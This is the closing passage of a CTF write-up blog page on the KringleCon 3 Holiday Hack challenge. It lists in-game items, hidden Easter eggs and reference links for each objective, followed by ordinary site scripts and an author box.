</tr>
<tr>
<td>Proxmark3</td>
<td><em>Wrapping Room</em>, on the floor</td>
<td>RFID Swiss-army tool</td>
</tr>
<tr>
<td>Portals</td>
<td><em>Speaker UNpreparedness Room</em>, from the vending machine</td>
<td>Good for shifting the Super Santavator Sparkle Stream across spacetime&hellip; or eating!</td>
</tr>
<tr>
<td>Yellow Bulb</td>
<td><em>Rooftop</em>, on the floor</td>
<td>It&rsquo;s a yellow bulb from those big, old-school christmas lights.</td>
</tr>
</tbody>
</table>
<h2 id="christmas-eggs">Christmas Eggs</h2>
<p>One of the quests I enjoy the most in the <em>Holiday Hack</em> challenges is to find as many hidden <em>Eggs</em> as possible! Here are the ones I spotted this year:</p>
<table>
<thead>
<tr>
<th>Location</th>
<th>Egg</th>
</tr>
</thead>
<tbody>
<tr>
<td>Challenge title</td>
<td><em>Three French Hens</em> comes from <a href="https://en.wikipedia.org/wiki/The_Twelve_Days_of_Christmas_(song)">The Twelve Days of Christmas</a> Christmas carol (the 3rd day of Christmas for the 3rd KringleCon)</td>
</tr>
<tr>
<td>Castle Approach</td>
<td><a href="https://www.richardfhallcustomhomes.com/">Richard F. Hall</a> panel on the grass, building homes in <em>Jersey Shore</em></td>
</tr>
<tr>
<td>Castle Approach</td>
<td>one of the hens, <em>Jean-Claude</em>, says &ldquo;Jacques DuGivre!&rdquo; in French which translates to <strong>Jack Frost</strong>.</td>
</tr>
<tr>
<td>Castle Entry</td>
<td>is the painting a portrait of <strong>Ed Skoudis</strong>?</td>
</tr>
<tr>
<td>Wrapping Room</td>
<td>the email on the wall asking <a href="https://twitter.com/herrmann1001">Iceman</a> if the name <em>Proxmark3</em> could be used freely</td>
</tr>
<tr>
<td>Objective 1</td>
<td>the <em>Enigma Machine</em> on the billboard image</td>
</tr>
<tr>
<td>Objective 6</td>
<td>the <em>Splunk</em> user is <strong>Kris Kringle</strong>, another name for <strong>Santa…but</strong> that could as well refer to the main protagonist of <a href="https://en.wikipedia.org/wiki/Miracle_on_34th_Street">Miracle on 34th Street</a></td>
</tr>
<tr>
<td>Objective 6</td>
<td><strong>Alice Bluebird</strong> is the main character of the graphic novel <a href="https://www.splunk.com/en_us/form/through-the-looking-glass-table.html">Through the Looking Glass Table</a> from <em>Splunk</em>.</td>
</tr>
<tr>
<td>Objective 6</td>
<td>the <em>Lollipop Guild</em> refers to <a href="https://www.youtube.com/watch?v=2XzFNLJIpUQ">The Wizard of Oz</a></td>
</tr>
<tr>
<td>Objective 8</td>
<td><a href="../../images/kringlecon3/objectives/obj08_19.webp">ASCII art</a> in the server&rsquo;s <code>tmp</code> folder</td>
</tr>
<tr>
<td>Objective 9</td>
<td>the <em>FTP</em> server <code>ftp.osuosl.org</code> actually exists and is owned by the <em>Open Source Lab</em> @ <em>Oregon State University</em></td>
</tr>
<tr>
<td>Objective 9</td>
<td>the final letter we retrieve refers to a lot of characters from <a href="https://www.imdb.com/title/tt0058536/">Rudolph the Red-Nosed Reinder</a></td>
</tr>
<tr>
<td>Objective 9</td>
<td>the final letter we retrieve <strong>Tanta Kringle</strong> is a character from <a href="https://rudolphtherednosedreindeer.fandom.com/wiki/Santa_Claus_Is_Comin_To_Town">Santa Claus Is Comin To Town</a></td>
</tr>
<tr>
<td>Objective 11</td>
<td>the elves on the shelf that are reporting kids bat behavior</td>
</tr>
<tr>
<td>CranPi 1</td>
<td><em>Jason The Plant</em> hidden in the &lsquo;plant&rsquo; menu (made appearances in past challenges)</td>
</tr>
<tr>
<td>CranPi 2</td>
<td>the <code>SESSNAME</code> environment variable is <code>Munchkin Wrangler</code> which refers to <em>The Wizard of Oz</em> movie</td>
</tr>
<tr>
<td>Soundtrack</td>
<td>the song played in the <em>Dining Room</em> is a remix of a <a href="https://www.youtube.com/watch?v=Fo7CirsFurs">The Year Without A Santa Claus</a> song</td>
</tr>
<tr>
<td>Soundtrack</td>
<td>the song in the <em>Courtyard</em> is a remix of a <a href="https://www.youtube.com/watch?v=3Hj3U18FHgQ">You&rsquo;re a Mean One, Mr Grinch</a></td>
</tr>
<tr>
<td>Soundtrack</td>
<td>the song in the <em>Kitchen</em> is a remix of <strong>Jimmy Boyd</strong>&rsquo;s <a href="https://www.youtube.com/watch?v=76K5UU0ihow">I saw Mommy kissing Santa Claus</a></td>
</tr>
<tr>
<td>Soundtrack</td>
<td>the Santavator&rsquo;s song is a remix of the <a href="https://www.youtube.com/watch?v=w7OHMCunm-w">Girl from Ipanema</a></td>
</tr>
<tr>
<td>Soundtrack</td>
<td>the song in the <em>???</em> room is a remix of <a href="https://www.youtube.com/watch?v=eU1lyz1xADM">I Wish I Could Be Santa Claus</a> from <em>A Muppets Christmas</em></td>
</tr>
<tr>
<td>Soundtrack</td>
<td>Santa&rsquo;s transformation song is a remix of <a href="https://www.youtube.com/watch?v=K_ma2ZYdIgA">Zat You Santa Claus</a> from Louis Armstrong</td>
</tr>
<tr>
<td>The Elf C0de</td>
<td>lollipops and Munchkins refer to the to <em>The Wizard of Oz</em> movie</td>
</tr>
<tr>
<td>Sort-O-Matic</td>
<td>the <em>Island of Misfit Toys</em> refers to <a href="https://www.imdb.com/title/tt0058536/">Rudolph the Red-Nosed Reinder</a></td>
</tr>
<tr>
<td>Snowball Game</td>
<td>the <code>ID</code> used for the win code is <code>HughRansomDrysdale</code> who is the villain in the movie <a href="https://www.imdb.com/title/tt8946378/">Knives Out</a></td>
</tr>
<tr>
<td>Snowball Game</td>
<td>the QR code shown when we loose directs us to <a href="http://www.counterhack.com">www.counterhack.com</a></td>
</tr>
</tbody>
</table>
<h2 id="additional-ressources">Additional Ressources</h2>
<hr />
<h4 id="objective-3">Objective 3</h4>
<ul>
<li><a href="https://www.electronjs.org">https://www.electronjs.org</a></li>
<li><a href="https://github.com/electron/asar">https://github.com/electron/asar</a></li>
<li><a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a></li>
</ul>
<h4 id="objective-6">Objective 6</h4>
<ul>
<li><a href="https://attack.mitre.org/matrices/enterprise/">https://attack.mitre.org/matrices/enterprise/</a></li>
<li><a href="https://github.com/splunk/attack_range">https://github.com/splunk/attack_range</a></li>
<li><a href="https://docs.splunk.com/Documentation/SCS/current/SearchReference/RexCommandOverview">https://docs.splunk.com/Documentation/SCS/current/SearchReference/RexCommandOverview</a></li>
<li><a href="https://docs.splunk.com/Documentation/SCS/current/SearchReference/Aggregatefunctions#distinct_count.28.26lt.3Bvalue.26gt.3B.29_or_dc.28.26lt.3Bvalue.26gt.3B.29">https://docs.splunk.com/Documentation/SCS/current/SearchReference/Aggregatefunctions#distinct_count.28.26lt.3Bvalue.26gt.3B.29_or_dc.28.26lt.3Bvalue.26gt.3B.29</a></li>
<li><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md</a></li>
<li><a href="https://github.com/frgnca/">https://github.com/frgnca/</a></li>
<li><a href="https://attack.mitre.org/techniques/T1123/">https://attack.mitre.org/techniques/T1123/</a></li>
<li><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md</a></li>
<li><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md#atomic-test-3---powershell-registry-runonce">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md#atomic-test-3---powershell-registry-runonce</a></li>
<li><a href="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat">https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat</a></li>
<li><a href="https://zeek.org/">https://zeek.org/</a></li>
<li><a href="https://tools.ietf.org/html/rfc74653">https://tools.ietf.org/html/rfc74653</a></li>
<li><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></li>
</ul>
<h4 id="objective-8">Objective 8</h4>
<ul>
<li><a href="https://portswigger.net/burp">https://portswigger.net/burp</a></li>
<li><a href="https://portswigger.net/web-security/file-path-traversal">https://portswigger.net/web-security/file-path-traversal</a></li>
<li><a href="https://ngrok.com/">https://ngrok.com/</a></li>
<li><a href="https://snyk.io/research/zip-slip-vulnerability">https://snyk.io/research/zip-slip-vulnerability</a></li>
</ul>
<h4 id="objective-10">Objective 10</h4>
<ul>
<li><a href="https://www.lifewire.com/web-browser-developer-tools-3988965">https://www.lifewire.com/web-browser-developer-tools-3988965</a></li>
</ul>
<h4 id="objective-11a">Objective 11a</h4>
<ul>
<li><a href="https://github.com/python/cpython/blob/master/Doc/library/random.rst">https://github.com/python/cpython/blob/master/Doc/library/random.rst</a></li>
<li><a href="https://github.com/python/cpython/blob/master/Modules/_randommodule.c">https://github.com/python/cpython/blob/master/Modules/_randommodule.c</a></li>
</ul>
<h4 id="objective-11b">Objective 11b</h4>
<ul>
<li><a href="https://github.com/corkami/collisions/blob/master/unicoll.md">https://github.com/corkami/collisions/blob/master/unicoll.md</a></li>
<li><a href="https://hexed.it/">https://hexed.it/</a></li>
<li><a href="https://github.com/corkami/collisions#pdf">https://github.com/corkami/collisions#pdf</a></li>
</ul>
<h4 id="cranpi-terminal-7">CranPi Terminal 7</h4>
<ul>
<li><a href="https://scapy.net/">https://scapy.net/</a></li>
</ul>

    </article>
    
    
<script defer src="/js/clipboard.min.1626706afc88d95ebe1173b553ec732c6dc82a576989315fdf5e7779af738a44.js"></script>

<script defer src="/js/helper/prev.min.js"></script>

<script defer src="/js/helper/prop.min.js"></script>
<script>
  'use strict';
  document.addEventListener('DOMContentLoaded', function () {
    
    var clipInit = false;
    var preChromaElem = document.querySelectorAll('pre.chroma');
    var langCodeElem = document.querySelectorAll('.language-code');
    var dollarCodeElem = document.querySelectorAll('div.language-\\$');
    var gtCodeElem = document.querySelectorAll('div.language-\\>');

    var makeClipboard = function(elem) {
      var code = elem,
          text = elem.textContent;
        
      if (text.length > 15) {
        if (!clipInit) {
          var text, clip = new ClipboardJS('.copy-to-clipboard', {
            text: function (trigger) {
              var codeElem = prev(trigger).querySelectorAll('code');
              if (codeElem.length > 1) {
                text = prev(trigger).querySelector('code[class^="language-"]').textContent;
              } else {
                text = prev(trigger).querySelector('code').textContent;
              }

              return text.replace(/^\$\s/gm, '');
            }
          });

          var inPre;
          clip.on('success', function (e) {
            e.clearSelection();
            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
            e.trigger.setAttribute('aria-label', 'Copied to clipboard!');
            e.trigger.classList.add('tooltipped');
            e.trigger.classList.add('tooltipped-w');
          });

          clip.on('error', function (e) {
            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
            e.trigger.setAttribute('aria-label', e.action.toString());
            e.trigger.classList.add('tooltipped');
            e.trigger.classList.add('tooltipped-w');
          });

          clipInit = true;
        }

        var notAllowedClass = ['language-mermaid', 'language-viz', 'language-wave', 'language-chart', 'language-msc', 'language-flowchart'];
        var isNotAllowedIncluded = false;
        var curClassName = code.getAttribute('class');

        for (var i = 0; i < notAllowedClass.length; i++) {
          if (curClassName && curClassName.startsWith(notAllowedClass[i])) {
            isNotAllowedIncluded = true;
            break;
          }
        }

        if (!isNotAllowedIncluded) {
          if (curClassName) {
            var newClipboardElem = document.createElement('span');
            newClipboardElem.setAttribute('class', 'copy-to-clipboard');
            newClipboardElem.setAttribute('title', 'Copy to clipboard');
            elem.parentNode.parentNode.insertBefore(newClipboardElem, elem.parentNode.nextElementSibling);
          }
        }
      }
    }

    var makeSymbolClipboard = function(elem) {
      var clipboardSpan = document.createElement('span');
      clipboardSpan.setAttribute('class', 'copy-to-clipboard');
      clipboardSpan.setAttribute('title', 'Copy to clipboard');
      elem.parentNode.parentNode.insertBefore(clipboardSpan, elem.parentNode.nextElementSibling);
    }

    preChromaElem ? 
    preChromaElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function(codeElem) {
        makeClipboard(codeElem);
      });
    }) : null;
    
    langCodeElem ? 
    langCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeClipboard(codeElem);
      });
    }) : null;

    dollarCodeElem ? 
    dollarCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeSymbolClipboard(codeElem);
      });
    }) : null;

    gtCodeElem ?
    gtCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeSymbolClipboard(codeElem);
      });
    }) : null;
    
  });
</script>
    <script>
  'use strict';
  
  function wrap(el, wrapper) {
    el.parentNode.insertBefore(wrapper, el);
    wrapper.appendChild(el);
  }

  (function () {
    var singleContentsElem = document.querySelector('.single__contents');
    singleContentsElem ? 
    singleContentsElem.querySelectorAll('pre > code').forEach(function(elem) {
      var dataLang = elem.getAttribute('data-lang');
      var dataLangWrapper = document.createElement('div');
      var code = null;
      var codeTitle = null;

      if (dataLang && dataLang.includes(':')) {
        code = dataLang.split(':')[0];
        codeTitle = dataLang.split(':')[1];

        dataLangWrapper.className = 'language-' + code;
        dataLangWrapper.setAttribute('data-lang', codeTitle);

        elem.className = 'language-' + code;
        elem.setAttribute('data-lang', codeTitle);
        elem.setAttribute('id', codeTitle);
      } else if (!dataLang) {
        dataLangWrapper.setAttribute('data-lang', 'Code');
        dataLangWrapper.className = 'language-code';
      }

      if (!dataLang || codeTitle) {
        wrap(elem.parentNode, dataLangWrapper);
      }

    }) : null;
  })();

  var langCodeElem = document.querySelectorAll('.language-code');
  langCodeElem ? langCodeElem.forEach(function (elem) {
    var newElem = document.createElement('span');
    newElem.className = 'copy-to-clipboard';
    newElem.setAttribute('title', 'Copy to clipboard');
    elem.append(newElem);
  }) : null;
  

  

  
  var dollarCodeElem = document.querySelectorAll('div.language-\\$');
  var gtCodeElem = document.querySelectorAll('div.language-\\>');

  dollarCodeElem ?
  dollarCodeElem.forEach(function(elem) {
    var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
    lnts ? 
    lnts.forEach(function(lnt) {
      lnt.innerHTML = '$<br/>';
    }) : null;
  }) : null;

  gtCodeElem ?
  gtCodeElem.forEach(function(elem) {
    var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
    lnts ? 
    lnts.forEach(function(lnt) {
      lnt.innerHTML = '><br/>';
    }) : null;
  }) : null;
  
</script>
    
<div class="donation">
  <div class="donation__message">
    Share on
  </div>
  <div class="donation__icons">
    
    
    
      
        <a href="https://twitter.com/intent/tweet?text=KringleCon%203%3a%20Three%20French%20Hens&url=https%3a%2f%2fnoobintheshell.com%2fposts%2fkringlecon3%2f&hashtags=kringlecon%2cholidayhack&via=noobintheshell_" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
          <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
        </a>
      
    
      
        <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fnoobintheshell.com%2fposts%2fkringlecon3%2f&title=KringleCon%203%3a%20Three%20French%20Hens &summary=This%20year%e2%80%99s%20challenges%20were%20a%20good%20mix%20of%20defensive%20and%20offensive%20skills.%20Topics%20varied%20from%20webapp%20hacking%2c%20crypto%2c%20log%20analysis%2c%20binary%20analysis%20to%20improving%20JS%2c%20regex%20and%20network%20skills.%20There%20were%20as%20well%20some%20simulated%20hardware%20challenges.%20The%20most%20challenging%20part%20was%20the%20analysis%20and%20recovery%20of%20a%20custom%20blockchain%27s%20block%20that%20was%20stealthily%20altered.&source=Cybersecurity%20blog%20and%20CTF%20write-ups" target="_blank" rel="noreferrer" title="LinkedIn" aria-label="LinkedIn Share Button" class="donation__item" data-type="share">
          <svg data-name="linkedin" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m23.994 24v-.001h.006v-8.802c0-4.306-.927-7.623-5.961-7.623-2.42 0-4.044 1.328-4.707 2.587h-.07v-2.185h-4.773v16.023h4.97v-7.934c0-2.089.396-4.109 2.983-4.109 2.549 0 2.587 2.384 2.587 4.243v7.801z"/><path d="m.396 7.977h4.976v16.023h-4.976z"/><path d="m2.882 0c-1.591 0-2.882 1.291-2.882 2.882s1.291 2.909 2.882 2.909 2.882-1.318 2.882-2.909c-.001-1.591-1.292-2.882-2.882-2.882z"/></svg>
        </a>
      
    
      
        <a href="https://www.reddit.com/submit?url=https%3a%2f%2fnoobintheshell.com%2fposts%2fkringlecon3%2f&amp;title=KringleCon%203%3a%20Three%20French%20Hens" target="_blank" rel="noreferrer" title="Reddit" aria-label="Reddit Share Button" onclick="window.open('http://www.reddit.com/submit?url=' + encodeURIComponent(document.URL) + '&amp;title=' +  encodeURIComponent(document.title)); return false;" class="donation__item" data-type="share">
          <svg data-name="reddit" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.325 9.308c-.758 0-1.425.319-1.916.816-1.805-1.268-4.239-2.084-6.936-2.171l1.401-6.406 4.461 1.016c0 1.108.89 2.013 1.982 2.013 1.113 0 2.008-.929 2.008-2.038s-.889-2.038-2.007-2.038c-.779 0-1.451.477-1.786 1.129l-4.927-1.108c-.248-.067-.491.113-.557.365l-1.538 7.062c-2.676.113-5.084.928-6.895 2.197-.491-.518-1.184-.837-1.942-.837-2.812 0-3.733 3.829-1.158 5.138-.091.405-.132.837-.132 1.268 0 4.301 4.775 7.786 10.638 7.786 5.888 0 10.663-3.485 10.663-7.786 0-.431-.045-.883-.156-1.289 2.523-1.314 1.594-5.115-1.203-5.117zm-15.724 5.41c0-1.129.89-2.038 2.008-2.038 1.092 0 1.983.903 1.983 2.038 0 1.109-.89 2.013-1.983 2.013-1.113.005-2.008-.904-2.008-2.013zm10.839 4.798c-1.841 1.868-7.036 1.868-8.878 0-.203-.18-.203-.498 0-.703.177-.18.491-.18.668 0 1.406 1.463 6.07 1.488 7.537 0 .177-.18.491-.18.668 0 .207.206.207.524.005.703zm-.041-2.781c-1.092 0-1.982-.903-1.982-2.011 0-1.129.89-2.038 1.982-2.038 1.113 0 2.008.903 2.008 2.038-.005 1.103-.895 2.011-2.008 2.011z"/></svg>
        </a>
      
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fnoobintheshell.com%2fposts%2fkringlecon3%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
          <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
        </a>
      
    
  </div>
</div>


    
    
<div class="whoami__gutter"></div>
<hr class="hr-slash whoami-hr"/>
<section class="whoami">
  <div class="whoami__image-wrapper">
    
    
      
        <img data-src="/images/whoami/avatar.jpg" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" alt="Avatar" class="lazyload whoami__image"/>
      
    
  </div>
  <div class="whoami__contents">
    <div class="whoami__written-by">
      WRITTEN BY
    </div>
    <div class="whoami__title">
      
        noobintheshell
      
    </div>
    <div class="whoami__desc">
      
        AppSec Engineer and CTFer
      
    </div>
    <div class="whoami__social">
      
      
      
      
      
      
      
      
      <a href="javascript:location.href%20=%20%27mailto:%27%20&#43;%20[%27noobintheshell%27,%27protonmail.com%27].join%28%27@%27%29" title="email" aria-label="email">
        <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-.4 4.25l-7.07 4.42c-.32.2-.74.2-1.06 0L4.4 8.25c-.25-.16-.4-.43-.4-.72 0-.67.73-1.07 1.3-.72L12 11l6.7-4.19c.57-.35 1.3.05 1.3.72 0 .29-.15.56-.4.72z"/></svg>
      </a>
      
      
      
      
      
      
      
      <a href="https://github.com/noobintheshell" title="github" aria-label="github">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 24 24" version="1.1">
<g id="surface3680">
<path fill="currentColor" d="M 10.898438 2.101562 C 6.300781 2.601562 2.601562 6.300781 2.101562 10.800781 C 1.601562 15.5 4.300781 19.699219 8.398438 21.300781 C 8.699219 21.398438 9 21.199219 9 20.800781 L 9 19.199219 C 9 19.199219 8.601562 19.300781 8.101562 19.300781 C 6.699219 19.300781 6.101562 18.101562 6 17.398438 C 5.898438 17 5.699219 16.699219 5.398438 16.398438 C 5.101562 16.300781 5 16.300781 5 16.199219 C 5 16 5.300781 16 5.398438 16 C 6 16 6.5 16.699219 6.699219 17 C 7.199219 17.800781 7.800781 18 8.101562 18 C 8.5 18 8.800781 17.898438 9 17.800781 C 9.101562 17.101562 9.398438 16.398438 10 16 C 7.699219 15.5 6 14.199219 6 12 C 6 10.898438 6.5 9.800781 7.199219 9 C 7.101562 8.800781 7 8.300781 7 7.601562 C 7 7.199219 7 6.601562 7.300781 6 C 7.300781 6 8.699219 6 10.101562 7.300781 C 10.601562 7.101562 11.300781 7 12 7 C 12.699219 7 13.398438 7.101562 14 7.300781 C 15.300781 6 16.800781 6 16.800781 6 C 17 6.601562 17 7.199219 17 7.601562 C 17 8.398438 16.898438 8.800781 16.800781 9 C 17.5 9.800781 18 10.800781 18 12 C 18 14.199219 16.300781 15.5 14 16 C 14.601562 16.5 15 17.398438 15 18.300781 L 15 20.898438 C 15 21.199219 15.300781 21.5 15.699219 21.398438 C 19.398438 19.898438 22 16.300781 22 12.101562 C 22 6.101562 16.898438 1.398438 10.898438 2.101562 Z M 10.898438 2.101562 "/>
</g>
</svg>

      </a>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      <a href="https://twitter.com/noobintheshell_" title="twitter" aria-label="twitter">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 32 32" version="1.1">
<g id="surface676">
<path fill="currentColor" d="M 28 8.558594 C 27.117188 8.949219 26.167969 9.214844 25.171875 9.332031 C 26.1875 8.722656 26.96875 7.757812 27.335938 6.609375 C 26.386719 7.171875 25.332031 7.582031 24.210938 7.804688 C 23.3125 6.847656 22.03125 6.246094 20.617188 6.246094 C 17.898438 6.246094 15.691406 8.453125 15.691406 11.171875 C 15.691406 11.558594 15.734375 11.933594 15.820312 12.292969 C 11.726562 12.089844 8.097656 10.128906 5.671875 7.148438 C 5.246094 7.875 5.003906 8.722656 5.003906 9.625 C 5.003906 11.332031 5.871094 12.839844 7.195312 13.722656 C 6.386719 13.695312 5.628906 13.476562 4.964844 13.105469 C 4.964844 13.128906 4.964844 13.148438 4.964844 13.167969 C 4.964844 15.554688 6.660156 17.546875 8.914062 17.996094 C 8.5 18.109375 8.066406 18.171875 7.617188 18.171875 C 7.300781 18.171875 6.988281 18.140625 6.691406 18.082031 C 7.316406 20.039062 9.136719 21.460938 11.289062 21.503906 C 9.605469 22.824219 7.480469 23.609375 5.175781 23.609375 C 4.777344 23.609375 4.386719 23.585938 4 23.539062 C 6.179688 24.9375 8.765625 25.753906 11.546875 25.753906 C 20.605469 25.753906 25.558594 18.25 25.558594 11.742188 C 25.558594 11.53125 25.550781 11.316406 25.542969 11.105469 C 26.503906 10.410156 27.339844 9.542969 28 8.558594 Z M 28 8.558594 "/>
</g>
</svg>

      </a>
      
      
      
      
      
      
      
      
      
      
      
      
    </div>
  </div>
</section>
<hr class="hr-slash whoami-hr" />


    <section class="related">
    
    
  </section>
    <div class="grow"></div>
<nav class="pagination-single">
  
    
      <a href="https://noobintheshell.com/posts/htb_book/" class="pagination-single__left">
        <div class="pagination-single__icon">
          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z"/></svg>
        </div>
        <div class="pagination-single__left-title">Hack The Box :: Book</div>      
      </a>
    
    <div class="grow"></div>
    
      <a href="https://noobintheshell.com/posts/mcafee_ctf_2021/" class="pagination-single__right">      
        <div class="pagination-single__right-title">MacAfee ATR CTF 2021</div>
        <div class="pagination-single__icon">
          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
        </div>
      </a>
    
  
</nav>
    
  
    <div id="disqus_thread"></div>
<script>
  let disqus_config = function () {
    
    
    
  };
  (function () {
    if (["127.0.0.1"].indexOf(window.location.hostname) != -1) {
      document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
      return;
    }
    var d = document, s = d.createElement('script'); s.async = true;
    s.src = 'https://' + 'noobintheshell' + '.disqus.com/embed.js';
  s.setAttribute('data-timestamp', +new Date());
  (d.head || d.body).appendChild(s);
  }) ();
</script>
  

    <div class="modal micromodal-slide" id="modal" aria-hidden="true">
  <div class="modal__overlay" tabindex="-1" data-micromodal-close>
    <div class="modal__container" role="dialog" aria-modal="true" aria-labelledby="modal-title">
      
      <div class="modal__content" id="modal-content">
        <div id="mySwipe" class="swipe">
          <div class="swipe-wrap">
          </div>
        </div>
      </div>

      <span class="modal__items">
        
        <span class="modal__header">
          <div class="modal__paging" title="Page Info" aria-label="Current Page">
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--close" title="Close" aria-label="Close Button" data-micromodal-close>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="25" height="25"><path fill="currentColor" d="M 21.734375 19.640625 L 19.636719 21.734375 C 19.253906 22.121094 18.628906 22.121094 18.242188 21.734375 L 13 16.496094 L 7.761719 21.734375 C 7.375 22.121094 6.746094 22.121094 6.363281 21.734375 L 4.265625 19.640625 C 3.878906 19.253906 3.878906 18.628906 4.265625 18.242188 L 9.503906 13 L 4.265625 7.761719 C 3.882813 7.371094 3.882813 6.742188 4.265625 6.363281 L 6.363281 4.265625 C 6.746094 3.878906 7.375 3.878906 7.761719 4.265625 L 13 9.507813 L 18.242188 4.265625 C 18.628906 3.878906 19.257813 3.878906 19.636719 4.265625 L 21.734375 6.359375 C 22.121094 6.746094 22.121094 7.375 21.738281 7.761719 L 16.496094 13 L 21.734375 18.242188 C 22.121094 18.628906 22.121094 19.253906 21.734375 19.640625 Z"/></svg>
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--full" title="Full Screen" aria-label="Full Screen Button">
